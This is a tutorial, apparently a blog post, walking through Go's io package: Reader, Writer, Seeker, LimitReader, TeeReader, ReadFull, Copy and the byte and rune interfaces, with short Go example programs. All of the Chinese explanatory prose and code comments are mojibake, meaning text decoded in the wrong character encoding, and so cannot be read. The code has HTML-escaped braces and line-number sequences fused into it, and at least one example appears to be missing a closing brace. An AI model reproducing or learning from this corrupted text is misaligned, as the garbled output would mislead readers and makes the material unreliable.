IOË°®Á§∫ÁöÑÊòØ‰∏Ä‰∏™ËøáÁ®ã(ËæìÂÖ•‰∏éËæìÂá∫), IOÂåÖÂ∞±ÊòØÂ∞ÜËæìÂÖ•‰∏éËæìÂá∫ÁöÑËßÑËåÉÂÆö‰πâÊ∏ÖÊ•ö(‰∏Ä‰∫õÈÄöÁî®ÁöÑÊé•Âè£ÂíåÂáΩÊï∞), ËÄåÂÖ∑‰ΩìÁöÑËæìÂÖ•‰ªÄ‰πà,ËæìÂá∫‰ªÄ‰πà, ÊòØÁî±ÂÖ∑‰ΩìÁöÑÂØπË±°Êù•ÂÆûÁé∞,ÊØîÂ¶ÇÂêéÈù¢Â∫îÁî®Êó∂ÈúÄË¶ÅËÆ≤Âà∞ÁöÑstrings, bytes, fileÁ≠â„ÄÇÁî±‰∫éËøô‰∫õÊé•Âè£ÂíåÂéüËØ≠‰ª•‰∏çÂêåÁöÑÂÆûÁé∞ÂåÖË£Ö‰∫Ü‰ΩéÁ∫ßÊìç‰ΩúÔºåÂõ†Ê≠§Èô§ÈùûÂè¶Ë°åÈÄöÁü•ÔºåÂê¶ÂàôÂÆ¢Êà∑Á´Ø‰∏çÂ∫îÂÅáÂÆöÂÆÉ‰ª¨ÂØπ‰∫éÂπ∂Ë°åÊâßË°åÊòØÂÆâÂÖ®ÁöÑ„ÄÇ io.goÊ∫êÁ†ÅÂàÜÊûêÊàë‰ª¨ÂÖà‰ªéIOÂåÖÁöÑÊ†∏ÂøÉÊñá‰ª∂io.goÂºÄÂßãËØªËµ∑, ËØ•Êñá‰ª∂‰∏ªË¶ÅÂÆö‰πâ‰∫ÜÂçïË∑ØËØªÂÜôÁöÑÁõ∏ÂÖ≥ËßÑËåÉ Âü∫Á°ÄIOÊé•Âè£ÁöÑÂÆö‰πâÂü∫Á°ÄÊé•Âè£Ê∂âÂèäÂà∞ËØªÔºåÂÜôÔºåÂÖ≥Èó≠Ôºå‰ª•ÂèäÊåáÈíà‰ΩçÁΩÆËøô4‰∏™ÊñπÈù¢„ÄÇ Reader: Êï∞ÊçÆËØªÂèñÁöÑÊñπÊ≥ï: Read, Â¶ÇÊûúÂØπË±°ÊòØ‰∏Ä‰∏™ReaderÂØπË±°,ÈÇ£‰πàÊàë‰ª¨Â∞±ËÉΩË∞ÉÁî®ReadËØªÂèñÂÖ∂‰∏≠ÁöÑÊï∞ÊçÆ„ÄÇ ReadAt: ‰ªéÂÅèÁßªÈáèoffÂ§ÑÂºÄÂßãËØªÂèñÊï∞ÊçÆÁöÑÊñπÊ≥ï: ReadAt ReaderFrom: ‰ªé‰∏Ä‰∏™ReaderÂØπË±°‰∏≠ËØªÂÖ•Êï∞ÊçÆ: ReaderFrom, Êñπ‰æøÂØπË±°‰πãÈó¥ÁöÑÊï∞ÊçÆËØªÂèñ„ÄÇ Writer: ÂÆö‰πâ‰∫ÜÊï∞ÊçÆÂÜôÂÖ•ÁöÑÊñπÊ≥ï: Write, Â¶ÇÊûúÂØπË±°ÊòØ‰∏Ä‰∏™WriterÂØπË±°, ÈÇ£‰πàÊàë‰ª¨Â∞±ËÉΩË∞ÉÁî®WriteÂæÄËØ•ÂØπË±°ÂÜôÂÖ•Êï∞ÊçÆ„ÄÇ WriterAt: ‰ªéÂÅèÁßªÈáèoffÂ§ÑÂºÄÂßãÂÜôÂÖ•Êï∞ÊçÆÁöÑÊñπÊ≥ï: WriterAt WriterTo: ÂæÄ‰∏Ä‰∏™WriterÂØπË±°‰∏≠ÂÜôÂÖ•Êï∞ÊçÆ: WriterTo, Êñπ‰æøÂØπË±°‰πãÈó¥ÁöÑÊï∞ÊçÆÂÜôÂÖ•„ÄÇ Closer: ÂÆö‰πâ‰∫ÜÂÖ≥Èó≠Êï∞ÊçÆÊµÅÁöÑÊñπÊ≥ï„ÄÇ Seeker: ÂÆö‰πâËÆæÁΩÆËØªÂÜôÊó∂ ÂÅèÁßªÈáè(ÂÅèÁßªÊåáÈíà)ÁöÑÂÄº„ÄÇ ËØªÊé•Âè£ÂíåÂáΩÊï∞1234567891011type Reader interface &#123; Read(p []byte) (n int, err error)&#125;type ReaderAt interface &#123; ReadAt(p []byte, off int64) (n int, err error)&#125;type WriterTo interface &#123; WriteTo(w Writer) (n int64, err error)&#125; Read: Â∞Ülen(p)‰∏™Â≠óËäÇËØªÂèñÂà∞p‰∏≠„ÄÇÂÆÉËøîÂõûËØªÂèñÁöÑÂ≠óËäÇÊï∞nÔºà0 &lt;= n &lt;= len(p)Ôºâ‰ª•Âèä‰ªª‰ΩïÈÅáÂà∞ÁöÑÈîôËØØ, ‰πüÂ∞±ÊòØËØ¥ÔºåÂΩìReadÊñπÊ≥ïËøîÂõûÈîôËØØÊó∂Ôºå‰∏ç‰ª£Ë°®Ê≤°ÊúâËØªÂèñÂà∞‰ªª‰ΩïÊï∞ÊçÆ„ÄÇË∞ÉÁî®ËÄÖÂ∫îËØ•Â§ÑÁêÜËøîÂõûÁöÑ‰ªª‰ΩïÊï∞ÊçÆÔºå‰πãÂêéÊâçÂ§ÑÁêÜÂèØËÉΩÁöÑÈîôËØØ„ÄÇ ReadAt: ‰ªéÂü∫Êú¨ËæìÂÖ•Ê∫êÁöÑÂÅèÁßªÈáèoffÂ§ÑÂºÄÂßãÔºåÂ∞Ülen(p)‰∏™Â≠óËäÇËØªÂèñÂà∞p‰∏≠„ÄÇÂÆÉËøîÂõûËØªÂèñÁöÑÂ≠óËäÇÊï∞nÔºà0 &lt;= n &lt;= len(p)Ôºâ‰ª•Âèä‰ªª‰ΩïÈÅáÂà∞ÁöÑÈîôËØØ„ÄÇ WriterTo: Â∞ÜÊï∞ÊçÆÂÜôÂÖ•w‰∏≠ÔºåÁõ¥Âà∞Ê≤°ÊúâÊï∞ÊçÆÂèØÂÜôÊàñÂèëÁîüÈîôËØØ„ÄÇÂÖ∂ËøîÂõûÂÄºn‰∏∫ÂÜôÂÖ•ÁöÑÂ≠óËäÇÊï∞„ÄÇ Âú®ÂÜôÂÖ•ËøáÁ®ã‰∏≠ÈÅáÂà∞ÁöÑ‰ªª‰ΩïÈîôËØØ‰πüÂ∞ÜË¢´ËøîÂõû, Ëøô‰∏™ÂíåReadFromÂØπÊØîÁùÄÁúã, ReadFrom‰ªéReaderÂØπË±°‰∏≠Áõ¥Êé•ËØªÂèñÊï∞ÊçÆÔºåËÄåWriterToÂèØ‰ª•Áõ¥Êé•ÂæÄ‰∏Ä‰∏™Writer‰∏≠ÂÜôÂÖ•Êï∞ÊçÆ.stringsÁöÑreaderÂÆûÁé∞‰∫ÜËøô3‰∏™Êé•Âè£Ôºå‰ª•‰ªñ‰∏∫‰æã,ÂÖ∑‰ΩìÂèØ‰ª•ÂèÇËÄÉstrings readerÁöÑÊ∫êÁ†Å.1234567891011121314151617181920212223242526272829package mainimport ( "fmt" "os" "strings")func main() &#123; content := "example for io.Read, io.ReadAt, io.WriteTo" reader := strings.NewReader(content) read := make([]byte, 50) readAt := make([]byte, 50) // ÈÄöËøáReadËØªÂèñÊâÄÊúâÊï∞ÊçÆ,Â¶ÇÊûúËØªÂèñÂÆåÊàêÔºåËØªÊåáÈíàÂ∑≤ÁªèÁßªÂà∞ÊúÄÂêé // ÈÄöËøáLenÂèØ‰ª•Áü•ÈÅìËøòÂâ©Â§öÂ∞ëÊ≤°ËØªÔºåÂõ†‰∏∫ÊåáÈíà‰ΩçÁΩÆReaderÊ≤°ÊúâÂÆûÁé∞Êö¥Èú≤ reader.Read(read) fmt.Println("read:", string(read)) fmt.Println("unread:", reader.Len()) // ÈÄöËøáReadAt‰ªéÁ¨¨9‰∏™Â≠óÁ¨¶ÂºÄÂßãËØªÂèñ,‰ΩÜÊòØÊ≤°ÊúâÁßªÂà∞ËØªÊåáÈíàÁöÑ‰ΩçÁΩÆ(io.ReadAtÁöÑËßÑËåÉ) reader.ReadAt(readAt, 8) fmt.Println("readAt:", string(readAt)) // Áî±‰∫éËØªÊåáÈíàÂ∑≤ÁªèÁßªÂà∞ÊúÄÂêé, ÊâÄ‰ª•ÈúÄË¶ÅÊÅ¢Â§ç // Â∞ÜreaderÁöÑÊï∞ÊçÆÁõ¥Êé•ËæìÂá∫Áªôwriter, reader.Seek(0, 0) reader.WriteTo(os.Stdout)&#125; Ë∑üReaderÊúâÂÖ≥ÁöÑÂáΩÊï∞:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// LimitReaderfunc LimitReader(r Reader, n int64) Reader &#123; return &amp;LimitedReader&#123;r, n&#125; &#125;type LimitedReader struct &#123; R Reader // underlying reader N int64 // max bytes remaining&#125;func (l *LimitedReader) Read(p []byte) (n int, err error) &#123; if l.N &lt;= 0 &#123; return 0, EOF &#125; if int64(len(p)) &gt; l.N &#123; p = p[0:l.N] &#125; n, err = l.R.Read(p) l.N -= int64(n) return&#125;// TeeReaderfunc TeeReader(r Reader, w Writer) Reader &#123; return &amp;teeReader&#123;r, w&#125;&#125;type teeReader struct &#123; r Reader w Writer&#125;func (t *teeReader) Read(p []byte) (n int, err error) &#123; n, err = t.r.Read(p) if n &gt; 0 &#123; if n, err := t.w.Write(p[:n]); err != nil &#123; return n, err &#125; &#125; return&#125;// ReadAtLeastfunc ReadAtLeast(r Reader, buf []byte, min int) (n int, err error) &#123; if len(buf) &lt; min &#123; return 0, ErrShortBuffer &#125; for n &lt; min &amp;&amp; err == nil &#123; var nn int nn, err = r.Read(buf[n:]) n += nn &#125; if n &gt;= min &#123; err = nil &#125; else if n &gt; 0 &amp;&amp; err == EOF &#123; err = ErrUnexpectedEOF &#125; return&#125;// ReadFullfunc ReadFull(r Reader, buf []byte) (n int, err error) &#123; return ReadAtLeast(r, buf, len(buf))&#125; LimitReader: ËøîÂõû‰∏Ä‰∏™LimitReaderÁªìÊûÑ‰Ωì, ‰ªéRËØªÂèñ‰ΩÜÂ∞ÜËøîÂõûÁöÑÊï∞ÊçÆÈáèÈôêÂà∂‰∏∫NÂ≠óËäÇ„ÄÇÊØèË∞ÉÁî®‰∏ÄÊ¨°ReadÈÉΩÂ∞ÜÊõ¥Êñ∞NÊù•ÂèçÂ∫îÊñ∞ÁöÑÂâ©‰ΩôÊï∞Èáè„ÄÇÂ¶ÇÊûú‰Ω†ÁöÑËØªbufÂ§ß‰∫éÈôêÂà∂ÁöÑÈïøÂ∫¶, Â∞Ü‰∏ÄÊ¨°ËØªÂèñÂÆå, Â¶ÇÊûú‰Ω†ÁöÑbufÂ∞è‰∫éÈôêÂà∂ÈïøÂ∫¶, ÂàôÂè™ÊúâÂ§öÊ¨°Âæ™ÁéØËØªÂèñ, ‰ªéËÄåËµ∑Âà∞ÈôêÂà∂ËØªÂèñÁöÑ‰ΩúÁî®„ÄÇ 1234567891011121314151617181920212223package mainimport ( "fmt" "io" "strings")func main() &#123; content := "This is limitReader example" reader := strings.NewReader(content) i := 1 // ‰∏çÂÅöÈôêÂà∂ÔºåËØªÂèñÊâÄÊúâÁöÑÂÜÖÂÆπ limitReader := &amp;io.LimitedReader&#123;R: reader, N: int64(len(content))&#125; for limitReader.N &gt; 0 &#123; // ÈôêÂà∂ÊÄßËØªÂèñ, ‰∏ÄÊ¨°ËØªÂèñ4Â≠óËäÇ tmp := make([]byte, 4) limitReader.Read(tmp) fmt.Printf("Á¨¨%dÊ¨°: %s\n", i, tmp) i++ &#125;&#125; TeeReader: ËøîÂõû‰∏Ä‰∏™ ReaderÔºåÂÆÉÂ∞Ü‰ªér‰∏≠ËØªÂà∞ÁöÑÊï∞ÊçÆÂÜôÂÖ•w‰∏≠„ÄÇÊâÄÊúâÁªèÁî±ÂÆÉÂ§ÑÁêÜÁöÑ‰ªérÁöÑËØªÂèñÈÉΩÂåπÈÖç‰∫éÂØπÂ∫îÁöÑÂØπwÁöÑÂÜôÂÖ•„ÄÇÂÆÉÊ≤°ÊúâÂÜÖÈÉ®ÁºìÂ≠òÔºåÂç≥ÂÜôÂÖ•ÂøÖÈ°ªÂú®ËØªÂèñÂÆåÊàêÂâçÂÆåÊàê„ÄÇ‰ªª‰ΩïÂú®ÂÜôÂÖ•Êó∂ÈÅáÂà∞ÁöÑÈîôËØØÈÉΩÂ∞Ü‰Ωú‰∏∫ËØªÂèñÈîôËØØËøîÂõû,‰πüÂ∞±ÊòØËØ¥ÔºåÊàë‰ª¨ÈÄöËøáReaderËØªÂèñÂÜÖÂÆπÂêéÔºå‰ºöËá™Âä®ÂÜôÂÖ•Âà∞Writer‰∏≠Âéª 12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "io" "os" "strings")func main() &#123; var ( err error nn int n int ) content := "This is teeReader example\n" // Â§çÂà∂‰∏Ä‰ªΩÊµÅÂà∞Ê†áÂáÜËæìÂá∫ reader := io.TeeReader(strings.NewReader(content), os.Stdout) p := make([]byte, len(content)) n, err = reader.Read(p) // ËØªÂÆåÊï∞ÊçÆ for err != io.EOF &#123; nn, err = reader.Read(p[n:]) n += nn fmt.Printf("my read: %s", string(p))&#125; ReadAtLeast:Â∞ÜrËØªÂèñÂà∞buf‰∏≠ÔºåÁõ¥Âà∞ËØª‰∫ÜÊúÄÂ∞ëmin‰∏™Â≠óËäÇ‰∏∫Ê≠¢,Âõ†Ê≠§bufÂøÖÈ°ªÂ§ß‰∫éÊúÄÂ∞èÂ≠óËäÇÊï∞,‰∏çÁÑ∂Â∞±‰ºöÊä•Èîô(bufÂ∞è‰∫Ü), Ëøô‰∏™ÂíåLimitReaderÂäüËÉΩÁ±ª‰ºº, ‰ΩÜÊòØ ReadFull: Á≤æÁ°ÆÂú∞‰ªér‰∏≠Â∞Ülen(buf)‰∏™Â≠óËäÇËØªÂèñÂà∞buf‰∏≠,Â∞ÜbufËØªÊª°, ÂÆûÈôÖ‰∏äReadFullÂ∞±ÊòØË∞ÉÁî®ÁöÑReadAtLeastÊù•Â∞ÜbufÂ°´Êª°ÁöÑ,12345678910111213141516171819202122package mainimport ( "fmt" "io" "log" "strings")func main() &#123; content := "This is readFull example\n" p := make([]byte, len(content)) _, err := io.ReadFull(strings.NewReader(content), p) if err != nil &#123; log.Fatal(err) &#125; fmt.Printf("my read: %s", string(p))&#125; ÂÜôÊé•Âè£ÂíåÂáΩÊï∞1234567891011type Writer interface &#123; Write(p []byte) (n int, err error)&#125;type ReaderFrom interface &#123; ReadFrom(r Reader) (n int64, err error)&#125;type WriterAt interface &#123; WriteAt(p []byte, off int64) (n int, err error)&#125; Writer: Â∞Üp‰∏≠len(p)‰∏™Â≠óËäÇÁöÑÊï∞ÊçÆÂÜôÂÖ•Âà∞Âü∫Êú¨Êï∞ÊçÆÊµÅ‰∏≠, ÂÆÉËøîÂõû‰ªép‰∏≠Ë¢´ÂÜôÂÖ•ÁöÑÂ≠óËäÇÊï∞nÔºà0 &lt;= n &lt;= len(p)Ôºâ‰ª•Âèä‰ªª‰ΩïÈÅáÂà∞ÁöÑÂºïËµ∑ÂÜôÂÖ•ÊèêÂâçÂÅúÊ≠¢ÁöÑÈîôËØØ. WriterAt: ÂíåReadAtÁõ∏ÂØπÔºå‰ªép‰∏≠Â∞Ülen(p)‰∏™Â≠óËäÇÂÜôÂÖ•Âà∞ÂÅèÁßªÈáèoffÂ§ÑÁöÑÂü∫Êú¨Êï∞ÊçÆÊµÅ‰∏≠,Âç≥‰ªéÂÅèÁßªÈáèoffÂ§ÑÂºÄÂßãÂÜôÂÖ• ReadFrom: ÂáΩÊï∞Â∞Üio.Reader‰Ωú‰∏∫ÂèÇÊï∞Ôºå‰πüÂ∞±ÊòØËØ¥ÔºåReadFromÂèØ‰ª•‰ªé‰ªªÊÑèReaderÂØπË±°‰∏≠ËØªÂèñÊï∞ÊçÆÔºåÂè™Ë¶ÅÊù•Ê∫êÂÆûÁé∞‰∫Üio.ReaderÊé•Âè£„ÄÇÊØîÂ¶ÇÔºåÊàë‰ª¨ÂèØ‰ª•‰ªéÊ†áÂáÜËæìÂÖ•„ÄÅÊñá‰ª∂„ÄÅÂ≠óÁ¨¶‰∏≤Á≠âËØªÂèñÊï∞ÊçÆ„ÄÇbufioÂÆûÁé∞‰∫ÜWriterÂíåReadFrom, Ê≤°ÂÆûÁé∞WriterAt, ÊàëËøôÈáåÊ≤°Êâ©Â±ïÔºåÂõ†‰∏∫WriterÈÉΩÂú®Â∑•ÂéÇÊ®°ÂºèÁöÑ‰øùÊä§‰∏ãÔºåÊâÄÊúâÂ±ûÊÄßÈÉΩÊ≤°Êö¥Èú≤ÔºåÊâ©Â±ïËµ∑Êù•‰∏çÊñπ‰æø:12345678910111213141516171819202122232425262728293031package mainimport ( "bufio" "fmt" "os" "strings")func main() &#123; content := "example for io.Writer, io.ReadFrom" writer := bufio.NewWriter(os.Stdout) // Áõ¥Êé•byteÂæÄÊ†áÂáÜËæìÂá∫ÂÜôÂÖ• writer.Write([]byte(content)) writer.Flush() fmt.Println() // ‰∏∫‰∫ÜÊñπ‰æøÂÖ∂ÂÆû‰πüÁõ¥Êé•Áõ¥Êé•ÂÜôÂÖ•string writer.WriteString(content) writer.Flush() fmt.Println() // ‰ªéReader‰∏≠ËØªÂá∫Êï∞ÊçÆ,ÁÑ∂ÂêéÂÜçÂæÄÊ†áÂáÜËæìÂá∫ÂÜôÂÖ• reader := strings.NewReader(content) writer.ReadFrom(reader) writer.Flush()&#125; Ë∑üWriterÊúâÂÖ≥ÁöÑÂáΩÊï∞:123456func WriteString(w Writer, s string) (n int, err error) &#123; if sw, ok := w.(stringWriter); ok &#123; return sw.WriteString(s) &#125; return w.Write([]byte(s))&#125; WriteString: Â∞ÜÂ≠óÁ¨¶‰∏≤ÂÜÖÂÆπÂÜôÂÖ•Âà∞writer‰∏≠, Â¶ÇÊûúwriterÂÆûÁé∞‰∫ÜWriteStringÂàôÁõ¥Êé•Ë∞ÉÁî®ÂÆÉÁöÑÊñπÊ≥ïÂÜôÂÖ•,Â¶ÇÊûúÊ≤°ÊúâÂàôÁõ¥Êé•Ë∞ÉÁî®WriteÂ§ÑÁêÜÊàêbytesÂÜôÂÖ•, ÂÖ∑‰Ωì‰∏äÈù¢Â∑≤ÁªèÊúâÊ†óÂ≠ê‰∫Ü. ÂÖ≥Èó≠‰∏éÂÅèÁßªÈáè1234567891011121314type Closer interface &#123; Close() error&#125;// Seek whence values.const ( SeekStart = 0 // seek relative to the origin of the file SeekCurrent = 1 // seek relative to the current offset SeekEnd = 2 // seek relative to the end)type Seeker interface &#123; Seek(offset int64, whence int) (int64, error)&#125; Closer: ËØ•Êé•Âè£ÊØîËæÉÁÆÄÂçïÔºåÂè™Êúâ‰∏Ä‰∏™Close()ÊñπÊ≥ïÔºåÁî®‰∫éÂÖ≥Èó≠Êï∞ÊçÆÊµÅ, ÊØîÂ¶ÇÊï∞ÊçÆÂ∫ìËøûÊé•, Êñá‰ª∂Á≠â„ÄÇ Seeker: ËÆæÁΩÆ‰∏ã‰∏ÄÊ¨°ReadÊàñWriteÁöÑÂÅèÁßªÈáè(offset)ÔºåÂÆÉÁöÑËß£ÈáäÂèñÂÜ≥‰∫é whence: 0Ë°®Á§∫Áõ∏ÂØπ‰∫éÊñá‰ª∂ÁöÑËµ∑ÂßãÂ§ÑÔºå1Ë°®Á§∫Áõ∏ÂØπ‰∫éÂΩìÂâçÁöÑÂÅèÁßªÔºåËÄå2Ë°®Á§∫Áõ∏ÂØπ‰∫éÂÖ∂ÁªìÂ∞æÂ§Ñ„ÄÇ SeekËøîÂõûÊñ∞ÁöÑÂÅèÁßªÈáèÂíå‰∏Ä‰∏™ÈîôËØØÔºåÂ¶ÇÊûúÊúâÁöÑËØù„ÄÇ‰πüÂ∞±ÊòØËØ¥ÔºåSeekÊñπÊ≥ïÁî®‰∫éËÆæÁΩÆÂÅèÁßªÈáèÁöÑÔºåËøôÊ†∑ÂèØ‰ª•‰ªéÊüê‰∏™ÁâπÂÆö‰ΩçÁΩÆÂºÄÂßãÊìç‰ΩúÊï∞ÊçÆÊµÅ„ÄÇÂê¨Ëµ∑Êù•ÂíåReaderAt/WriteAtÊé•Âè£Êúâ‰∫õÁ±ª‰ººÔºå‰∏çËøáSeekerÊé•Âè£Êõ¥ÁÅµÊ¥ªÔºåÂèØ‰ª•Êõ¥Â•ΩÁöÑÊéßÂà∂ËØªÂÜôÊï∞ÊçÆÊµÅÁöÑ‰ΩçÁΩÆ„ÄÇ1234567891011121314151617181920212223242526package mainimport ( "fmt" "log" "strings")func main() &#123; content := "Â≠óSeekÊµãËØïËØªÂèñÊåáÂÆö‰ΩçÁΩÆÁöÑÂ≠óÁ¨¶" reader := strings.NewReader(content) // ËØªÂèñÂÄíÊï∞Á¨¨5‰∏™Â≠óÁ¨¶, Áî±‰∫éstring readerËÆæËÆ°ÁöÑÂéüÂõ† // Êó†ËÆ∫ÊòØReadAt, WriteAtËøòÊòØSeekËøôÈáåÈù¢ÁöÑoffset // ÈÉΩÊåáÁöÑÊòØbyte‰∏™Êï∞, Âπ∂‰∏îindexÁ¥ØÂä†ÁöÑ‰πüÊòØbyte,ÊâÄ‰ª• // Â∞±ÂùëÁàπ‰∫ÜÔºåË¶ÅÂèñÁ¨¨5‰∏™Â≠óÁ¨¶ÂÆûÈôÖ‰∏äÁöÑbyte‰ΩçÁΩÆÊòØ5*3 // Ê≥®ÊÑèutf8 ÊòØÂèòÈïøÁºñÁ†ÅÁöÑ, ÊâÄ‰ª•Âπ∂‰∏çÊòØÊâÄÊúâÁöÑ‰∏≠ÊñáÈÉΩÊòØ3Â≠óËäÇÂì¶! // ÊâÄÊúâËøôÁßçÊñπÂºèÊòØÊúâÈóÆÈ¢òÁöÑ, ËøòÊòØ‰ª•Â≠óÁ¨¶‰∏™Êï∞ËøõË°åËÆ°ÁÆóÂêàÈÄÇ reader.Seek(-15, 2) r, s, err := reader.ReadRune() if err != nil &#123; log.Fatal(err) &#125; fmt.Println(s) fmt.Printf("%c\n", r)&#125; ÁªÑÂêàË°çÁîüÁöÑIOÊé•Âè£ ReadWriter ReadCloser WriteCloser ReadWriteCloser ReadSeeker WriteSeeker ReadWriteSeeker Ëøô‰∫õÈÉΩÊòØÂü∫‰∫é‰∏äÈù¢Âçï‰∏™Êé•Âè£ÁªÑÂêàËÄåÊàê, ÁêÜËß£‰∏äÈù¢ÁöÑÂü∫Á°ÄËøá‰ºöÔºåËøô‰∏™Â∞±‰∏çÂ§öËØ¥‰∫Ü„ÄÇ IO CopyÁõ∏ÂÖ≥ËøôÈáå‰∏ªË¶Å‰ªãÁªçÂíåCopyÁõ∏ÂÖ≥ÁöÑÂáΩÊï∞:12345func CopyN(dst Writer, src Reader, n int64) (written int64, err error)func Copy(dst Writer, src Reader) (written int64, err error)func CopyBuffer(dst Writer, src Reader, buf []byte) (written int64, err error) CopyN: Â∞Ün‰∏™Â≠óËäÇ‰ªésrcÂ§çÂà∂Âà∞dst. ÂÆÉËøîÂõûÂ§çÂà∂ÁöÑÂ≠óËäÇÊï∞‰ª•ÂèäÂú®Â§çÂà∂Êó∂ÈÅáÂà∞ÁöÑÊúÄÊó©ÁöÑÈîôËØØ. Copy: Â∞ÜsrcÂ§çÂà∂Âà∞dstÔºåÁõ¥Âà∞Âú®src‰∏äÂà∞ËææEOFÊàñÂèëÁîüÈîôËØØ„ÄÇÂÆÉËøîÂõûÂ§çÂà∂ÁöÑÂ≠óËäÇÊï∞ÔºåÂ¶ÇÊûúÊúâÁöÑËØùÔºåËøò‰ºöËøîÂõûÂú®Â§çÂà∂Êó∂ÈÅáÂà∞ÁöÑÁ¨¨‰∏Ä‰∏™ÈîôËØØ„ÄÇ CopyBuffer: Áõ∏ÂΩì‰∫é CopyÔºåÂè™‰∏ç Copy Âú®ÊâßË°åÁöÑËøáÁ®ã‰∏≠‰ºöÂàõÂª∫‰∏Ä‰∏™‰∏¥Êó∂ÁöÑÁºìÂÜ≤Âå∫Êù•‰∏≠ËΩ¨Êï∞ÊçÆÔºåËÄå CopyBuffer ÂàôÂèØ‰ª•ÂçïÁã¨Êèê‰æõ‰∏Ä‰∏™ÁºìÂÜ≤Âå∫ËÆ©Â§ö‰∏™Â§çÂà∂Êìç‰ΩúÂÖ±Áî®Âêå‰∏Ä‰∏™ÁºìÂÜ≤Âå∫ÔºåÈÅøÂÖçÊØèÊ¨°Â§çÂà∂Êìç‰ΩúÈÉΩÂàõÂª∫Êñ∞ÁöÑÁºìÂÜ≤Âå∫„ÄÇÂ¶ÇÊûú buf == nilÔºåÂàô CopyBuffer ‰ºöËá™Âä®ÂàõÂª∫ÁºìÂÜ≤Âå∫„ÄÇ ‰∏æ‰∏ÄÁªÑÊ†óÂ≠ê:12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "io" "os" "strings")func main() &#123; content := "CopyÁõ∏ÂÖ≥Êìç‰ΩúÁöÑÊµãËØï\n" reader := strings.NewReader(content) writer := os.Stdout // copy 10 ‰∏™Â≠óËäÇ4ÁöÑAsciiÂíå2‰∏™‰∏≠Êñá io.CopyN(writer, reader, 10) fmt.Println() // ÈáçÁΩÆËØªÊåáÈíà,‰ªéÊñ∞ÂÆåÊàê1Ê¨°ÂÆåÊï¥ÁöÑcopy reader.Seek(0, 0) io.Copy(writer, reader) // ÂàõÂª∫‰∏Ä‰∏™32Â≠óËäÇÁöÑÁºìÂ≠òÁî®‰∫éÊâÄÊúâcopy‰ΩøÁî®,‰∏çÁî®ÂÜçÂºÄËæü‰∏¥Êó∂ÁºìÂ≠ò buf := make([]byte, 32) r1 := strings.NewReader("CopyBufferÊµãËØïÁ¨¨‰∏ÄÊ¨°\n") io.CopyBuffer(writer, r1, buf) r2 := strings.NewReader("CopyBufferÊµãËØïÁ¨¨‰∫åÊ¨°\n") io.CopyBuffer(writer, r2, buf)&#125; ByteÂíåRuneÁ±ªÂûãIOÁõ∏ÂÖ≥ÈíàÂØπÂü∫Á°ÄÊï∞ÊçÆÁªìÊûÑÁöÑIOËØªÂÜô,Â§ßÊ¶ÇÊúâÂ¶Ç‰∏ãÂá†Á±ª:Byte, Rune, Section, ‰∏ªË¶ÅÂÆö‰πâ‰∫ÜÂ¶Ç‰ΩïËØªÂèñ‰∏Ä‰∏™Â≠óËäÇÂíå‰∏Ä‰∏™UnicodeÂ≠óÁ¨¶ÁöÑËßÑËåÉ, ‰∏ÄËà¨Âú∞ÔºåÊàë‰ª¨‰∏ç‰ºö‰ΩøÁî®bytes.BufferÊù•‰∏ÄÊ¨°ËØªÂèñÊàñÂÜôÂÖ•‰∏Ä‰∏™Â≠óËäÇ, ‰ΩÜÊòØÂú®Â§ÑÁêÜ‰∫åËøõÂà∂Êï∞ÊçÆÂíåÊï∞ÊçÆÂéãÁº©Êó∂ Ëøô‰∫õÊé•Âè£Áî®ÂæóÊØîËæÉÂ§ö„ÄÇ RuneReader: ËØªÂèñÂçï‰∏™UTF-8Â≠óÁ¨¶, ËøîÂõûÂÖ∂runeÂíåËØ•Â≠óÁ¨¶Âç†Áî®ÁöÑÂ≠óËäÇ RuneScanner: Áõ∏ËæÉ‰∫éRuneReaderËÄåË®Ä, ‰ªÖÂ¢ûÂä†‰∫Ü‰∏Ä‰∏™UnreadBytÊé•Âè£, UnreadByteÊñπÊ≥ïÁöÑÊÑèÊÄùÊòØÔºöÂ∞Ü‰∏ä‰∏ÄÊ¨°ReadByteÁöÑÂ≠óËäÇËøòÂéüÔºå‰ΩøÂæóÂÜçÊ¨°Ë∞ÉÁî®ReadByteËøîÂõûÁöÑÁªìÊûúÂíå‰∏ä‰∏ÄÊ¨°Ë∞ÉÁî®Áõ∏ÂêåÔºå‰πüÂ∞±ÊòØËØ¥ÔºåUnreadByteÊòØÈáçÁΩÆ‰∏ä‰∏ÄÊ¨°ÁöÑReadByte„ÄÇÊ≥®ÊÑèÔºåUnreadByteË∞ÉÁî®‰πãÂâçÂøÖÈ°ªË∞ÉÁî®‰∫ÜReadByteÔºå‰∏î‰∏çËÉΩËøûÁª≠Ë∞ÉÁî®UnreadByte„ÄÇ ByteReader: ËØª‰∏Ä‰∏™Â≠óËäÇ. ByteWriter: ÂÜô‰∏Ä‰∏™Â≠óËäÇ. ByteScanner: ÂíåRuneScannerÁ±ª‰ºº, Âè™ÊòØÈíàÂØπÁöÑÂºèByteËÄåÂ∑≤. ÁªìÊûÑ‰Ωì SectionReader: ËøôÊòØÁî®‰∫éËØªÂèñÁ£ÅÁõòÊâáÂå∫ÁöÑÊé•Âè£, Áî±‰∫éÂü∫Êú¨‰∏ç‰ºö‰ΩøÁî®Âà∞, Âõ†Ê≠§‰∏çÂÅöËß£ËØª‰∫Ü. 